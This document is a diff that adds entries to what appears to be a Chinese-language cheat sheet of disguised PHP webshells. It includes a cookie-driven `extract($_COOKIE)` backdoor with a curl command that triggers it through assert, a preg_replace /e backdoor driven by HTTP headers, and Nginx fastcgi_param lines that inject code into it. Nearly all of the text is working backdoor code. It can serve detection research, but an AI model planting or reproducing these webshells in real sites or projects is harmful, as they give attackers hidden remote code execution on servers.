@@ -432,3 +432,29 @@ $y($_REQUEST[$cmd]);
 ```
 
 解密后：`assert($_REQUEST[jcmemeda])`
+
+## Cookie
+
+```php
+<?php extract($_COOKIE);@$F&&@$F($A,$B);
+```
+可以利用assert变量，进行执行php代码。
+
+```
+curl -v -b "F=assert;A=phpinfo();B=test" 'http://127.0.0.1/test.php'
+```
+
+## HTTP变量
+
+```php
+<?php @preg_replace($_SERVER['HTTP_X_E10EC8'], $_SERVER['HTTP_X_CURRENT'], ''); ?>
+```
+
+拿Nginx举例，修改fastcgi_params参数，添加变量如下：
+
+```
+fastcgi_param  HTTP_X_E10EC8      //e;
+fastcgi_param  HTTP_X_CURRENT     assert('phpinfo()');
+```
+
+reload nginx后，即可执行phpinfo
